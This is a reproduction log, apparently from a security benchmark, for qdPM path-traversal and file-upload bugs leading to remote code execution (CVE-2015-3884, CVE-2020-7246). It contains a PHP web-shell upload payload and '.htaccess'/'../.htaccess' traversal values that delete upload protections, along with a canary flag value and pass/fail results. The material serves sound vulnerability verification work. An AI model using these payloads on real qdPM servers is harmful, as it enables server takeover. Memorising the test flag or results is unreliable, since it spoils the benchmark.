# repro.log — qdpm-cve-2020-7246  (CVE-2015-3884 -> CVE-2020-7246)
# generated: 2026-07-10
# Product: qdPM (Symfony-1.4 PHP project-management app) — path traversal + file upload -> RCE (CWE-22 / CWE-434)
# per-run canary token planted at /flag/pcb_flag.txt (OUTSIDE docroot) from $PCB_FLAG.
#   final gate run flag: PCBFLAG_59dd66b5baeafc806834885453b701ae

## Recipe (no vendored app source / images committed)
  official php:7.4-apache (+gd,mysqli,pdo_mysql; AllowOverride All) + mariadb:10.11.
  qdPM released zip downloaded from SourceForge (qdPM_9.1.zip / qdPM_9.2.zip). Docker's build
  network blackholes SourceForge (host resolves to reserved 198.18/15, TLS hangs), so the gate
  pre-fetches the zips on the HOST into the build context (gitignored, removed at teardown) and
  the Dockerfile COPYs them. Only small text stays committed in the case dir.
  qdpm-entrypoint.sh (per profile, one qdPM container):
    1. plant $PCB_FLAG -> /flag/pcb_flag.txt (outside /var/www/html)
    2. drive qdPM's OWN HTTP installer (install/index.php?action=install_qdpm): loads install.sql,
       seeds the configuration table, writes core/config/databases.yml
    3. seed ONE ordinary member row (users: group=1, email=poc@pcb.local, password=MD5('pocpass'))
    4. V0 only: neutralise EVERY uploads/**/.htaccess script-block (models pre-CVE-2015-3884 state)
  No qdPM business code is modified.

## Roles
  V0 = qdPM 9.1, uploads/**/.htaccess neutralised (port 39450) — CVE-2015-3884 unmitigated
  V1 = qdPM 9.1 stock, uploads/**/.htaccess present    (port 39451) — CVE-2020-7246 residual   <- TARGET
  V2 = qdPM 9.2 stock, app::is_image() guards          (port 39452) — CVE-2020-7246 fixed (negative)

## Mechanism (source-verified via qdPM 9.1 / 9.2 SourceForge releases; see patch.diff)
  DEFENSE = the uploads script-block .htaccess "<FilesMatch \.(php...)> Deny from all", shipped in
       BOTH uploads/ AND uploads/users/ (Apache applies parent + dir .htaccess cumulatively). This
       is the mitigation the CVE-2015-3884 fix relies on; qdPM 9.1 still ships it.
  myAccount/update processForm (9.1) — UNGUARDED:
       - upload: move_uploaded_file(tmp, uploads/users/rand-<orig>)  (keeps .php extension; a php is
         not an image so app::image_resize leaves it intact)
       - delete: if(remove_photo==1 && photo_preview) unlink(sf_upload_dir.'/users/'.photo_preview)
         <- attacker-controlled photo_preview => arbitrary unlink (path traversal)
  CVE-2020-7246 fix (9.1 -> 9.2): wraps the upload move, the photo_preview reuse, AND the unlink in
       app::is_image() (mime_content_type). A .php never lands and '.htaccess'/'../.htaccess' are not
       images so they are never unlinked. app::is_image() is NEW in 9.2.

## Access model
  Driven as an ordinary qdPM member (not the virtual admin, whose id=0 has no users row and 404s on
  myAccount). Login accepts a 32-char md5 password (login/actions.class.php). CSRF: enabled on 9.1
  (login[_csrf_token] / users[_csrf_token]); DISABLED on 9.2 (csrf_secret commented out) — the oracle
  sends the token only when the page renders one.

## Payloads (driven through qdPM's real myAccount photo-upload flow; no app code touched)
  login member -> GET myAccount (scrape action + csrf + photo_preview) -> upload PHP web-shell as photo
  seed     (CVE-2015-3884): users[photo]=(pcb_seed.php, '<?php echo file_get_contents("/flag/pcb_flag.txt");?>')
                            then GET /uploads/users/<rand-pcb_seed.php>
  residual (CVE-2020-7246): same upload, then TWO myAccount updates with remove_photo=1 &
                            photo_preview='.htaccess' then '../.htaccess'  (unlink uploads/users/.htaccess
                            and uploads/.htaccess) ; then GET /uploads/users/<rand-pcb_bypass.php>

## V0 = qdPM 9.1, uploads/**/.htaccess neutralised (port 39450)
  seed  direct upload+GET : stored 180484-pcb_seed.php -> GET /uploads/users/... -> HTTP 200 CANARY-HIT

## V1 = qdPM 9.1 stock (port 39451) — THE TARGET the system attacks
  seed  direct upload+GET : stored 568378-pcb_seed.php -> GET -> HTTP 403 Forbidden -> no canary   <- seed BLOCKED (differential precondition; uploads/**/.htaccess honoured)
  residual traversal-delete: stored 250661-pcb_bypass.php ; unlink{.htaccess:200, ../.htaccess:200}
                            -> GET -> HTTP 200 CANARY-HIT   <- residual CONFIRMED (flag exfiltrated via RCE)

## V2 = qdPM 9.2 stock (port 39452) — negative (separately verified)
  seed  direct upload+GET : upload rejected (is_image) -> stored '' -> GET -> HTTP 403 -> no canary
  residual traversal-delete: upload rejected (is_image) -> stored '' ; unlink guarded -> both .htaccess
                            remain 266 bytes -> GET -> HTTP 403 -> no canary   <- residual CLOSED by 9.2 fix

